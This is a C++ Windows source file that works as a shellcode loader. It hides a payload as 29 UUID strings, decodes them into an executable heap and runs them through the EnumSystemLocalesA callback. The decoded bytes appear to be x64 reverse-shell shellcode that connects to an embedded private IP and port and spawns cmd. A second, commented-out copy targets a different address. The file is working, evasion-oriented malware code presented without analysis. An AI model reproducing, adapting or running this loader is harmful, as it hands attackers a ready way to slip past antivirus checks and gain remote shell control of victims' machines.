#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <vector>
#include <iostream>
#include <rpc.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma warning(disable:4996)

void litte_endian(unsigned int hexValue, unsigned char* byteArray, int size) {
	for (int i = 0; i < size; i++) {
		byteArray[i] = (hexValue >> (8 * i)) & 0xFF;
	}
}

int main(int argc, char* argv[]) {
	/*
	if (argc != 2) {
		printf("Check argc\n");
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)argv[1]);	// Target Process Attach

	if (hProcess == NULL) {
		printf("not pid attach\n");
		exit(0);
	}
	*/

	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);	// HeapCreate

	LPVOID hMemory = HeapAlloc(hHeap, 0, 0x100000);

	//DWORD_PTR hptr = (DWORD_PTR)hMemory;
	
	/*
	std::vector<std::string> uuidString = {
		"e48348fc-e8f0-00c0-0000-415141505251",
		"d2314856-4865-528b-6048-8b5218488b52",
		"728b4820-4850-b70f-4a4a-4d31c94831c0",
		"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
		"48514152-528b-8b20-423c-4801d08b8088",
		"48000000-c085-6774-4801-d0508b481844",
		"4920408b-d001-56e3-48ff-c9418b348848",
		"314dd601-48c9-c031-ac41-c1c90d4101c1",
		"f175e038-034c-244c-0845-39d175d85844",
		"4924408b-d001-4166-8b0c-48448b401c49",
		"8b41d001-8804-0148-d041-5841585e595a",
		"59415841-5a41-8348-ec20-4152ffe05841",
		"8b485a59-e912-ff57-ffff-5d49be777332",
		"0032335f-4100-4956-89e6-4881eca00100",
		"e5894900-bc49-0002-0050-c0a885814154",
		"4ce48949-f189-ba41-4c77-2607ffd54c89",
		"010168ea-0000-4159-ba29-806b00ffd550",
		"c9314d50-314d-48c0-ffc0-4889c248ffc0",
		"41c18948-eaba-df0f-e0ff-d54889c76a10",
		"894c5841-48e2-f989-41ba-99a57461ffd5",
		"40c48148-0002-4900-b863-6d6400000000",
		"41504100-4850-e289-5757-574d31c06a0d",
		"e2504159-66fc-44c7-2454-0101488d4424",
		"6800c618-8948-56e6-5041-504150415049",
		"5041c0ff-ff49-4dc8-89c1-4c89c141ba79",
		"ff863fcc-48d5-d231-48ff-ca8b0e41ba08",
		"ff601d87-bbd5-b5f0-a256-41baa695bd9d",
		"8348d5ff-28c4-063c-7c0a-80fbe07505bb",
		"6f721347-006a-4159-89da-ffd500000000"
	};
	*/

	std::vector<std::string> uuidString = {
		"e48348fc-e8f0-00c0-0000-415141505251",
		"d2314856-4865-528b-6048-8b5218488b52",
		"728b4820-4850-b70f-4a4a-4d31c94831c0",
		"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
		"48514152-528b-8b20-423c-4801d08b8088",
		"48000000-c085-6774-4801-d0508b481844",
		"4920408b-d001-56e3-48ff-c9418b348848",
		"314dd601-48c9-c031-ac41-c1c90d4101c1",
		"f175e038-034c-244c-0845-39d175d85844",
		"4924408b-d001-4166-8b0c-48448b401c49",
		"8b41d001-8804-0148-d041-5841585e595a",
		"59415841-5a41-8348-ec20-4152ffe05841",
		"8b485a59-e912-ff57-ffff-5d49be777332",
		"0032335f-4100-4956-89e6-4881eca00100",
		"e5894900-bc49-0002-22b8-0a0401694154",
		"4ce48949-f189-ba41-4c77-2607ffd54c89",
		"010168ea-0000-4159-ba29-806b00ffd550",
		"c9314d50-314d-48c0-ffc0-4889c248ffc0",
		"41c18948-eaba-df0f-e0ff-d54889c76a10",
		"894c5841-48e2-f989-41ba-99a57461ffd5",
		"40c48148-0002-4900-b863-6d6400000000",
		"41504100-4850-e289-5757-574d31c06a0d",
		"e2504159-66fc-44c7-2454-0101488d4424",
		"6800c618-8948-56e6-5041-504150415049",
		"5041c0ff-ff49-4dc8-89c1-4c89c141ba79",
		"ff863fcc-48d5-d231-48ff-ca8b0e41ba08",
		"ff601d87-bbd5-b5f0-a256-41baa695bd9d",
		"8348d5ff-28c4-063c-7c0a-80fbe07505bb",
		"6f721347-006a-4159-89da-ffd500000000"
	};
	
	std::vector<GUID> guidList;
	std::string inject_code;

	std::vector<BYTE> temp;

	

	for (const auto& uuidString : uuidString) {
		GUID guid;

		if (UuidFromStringA((RPC_CSTR)uuidString.c_str(), &guid) == RPC_S_OK) {		// UuidFromStringA
			guidList.push_back(guid);
		}
	}

	int guidList_size = guidList.size();

	//unsigned char* buffer = reinterpret_cast<unsigned char*> (hMemory);

	unsigned char* buffer = new unsigned char[guidList_size * 16];

	for (size_t i = 0; i < guidList.size(); i++) {		// Uuid Shell Code move to buffer
		GUID* guid_ptr = &guidList[i];

		litte_endian(guid_ptr->Data1, buffer + (i * 16), 4);
		litte_endian(guid_ptr->Data2, buffer + (i * 16) + 4, 2);
		litte_endian(guid_ptr->Data3, buffer + (i * 16) + 6, 2);

		for (int j = 0; j < 8; j++) {
			buffer[(i * 16) + 8 + j] = guid_ptr->Data4[j];
		}
	}

	//printf("%x\n", buffer[0]);

	memcpy(hMemory, buffer, guidList_size * 16);

	//printf("%x\n", buffer[0]);

	delete[] buffer;

	if (EnumSystemLocalesA((LOCALE_ENUMPROCA)hMemory, 0) == 0)
	{
		printf("%u", GetLastError());
	}
	
	//printf("%x", *reinterpret_cast<unsigned char*>(hMemory));

	//hMemory = buffer;

	//printf("%x", hMemory);
	//printf("%x", buffer);

	//EnumSystemLocalesA(hMemory, )

	/*
	for (const auto& guid : guidList) {

		

		litte_endian(guid.Data1, buffer + i, 4);
		litte_endian(guid.Data2, buffer + (i + 4), 2);
		litte_endian(guid.Data3, buffer + (i + 6), 2);

		for (int j = 0; j < 8; j++) {
			buffer[(i + 8) + j] = guid.Data4[j];
		}
		//printf("%x\n", buffer[4]);
		//printf("%x\n", buffer[5]);
		//printf("%x\n", buffer[6]);
		//rintf("%x\n", buffer[7]);
		//printf("%x\n", buffer[8]);
		//printf("%x\n", guid.Data4[1]);
		//printf("%x\n", buffer[10]);
		//printf("%x\n", guid.Data4[3]);
		//printf("%hu\n", guid.Data2);

		i += 16;

		//for (int k = 0; k < sizeof(buffer); k++) {
		//	printf("%x", buffer[k]);
		//}

		//printf("%x\n", buffer[17]);
		//break;

		//int i = 0;

		//std::cout << guid.Data1 << guid.Data2 << guid.Data3 << guid.Data4;
		//char temp_buffer[64] = { 0, };
		
		sprintf(buffer, "%02x%02x%02x%02x%02x%02x%02x%02x", guid.Data4[0],
			guid.Data4[1], 
			guid.Data4[2], 
			guid.Data4[3], 
			guid.Data4[4], 
			guid.Data4[5], 
			guid.Data4[6], 
			guid.Data4[7]);


		
		
		sprintf(buffer, "%lu%hu%hu%s", guid.Data1, guid.Data2, guid.Data3, temp_buffer);
		
		//printf("%s\n", buffer);

		//break;
		//i += 16;
	}
	*/

	//printf("check %s", inject_code.c_str());

	//MessageBoxA(NULL, inject_code.c_str(), "aaaaa", MB_OK);
	

	Sleep(1000000);

	return 0;
}
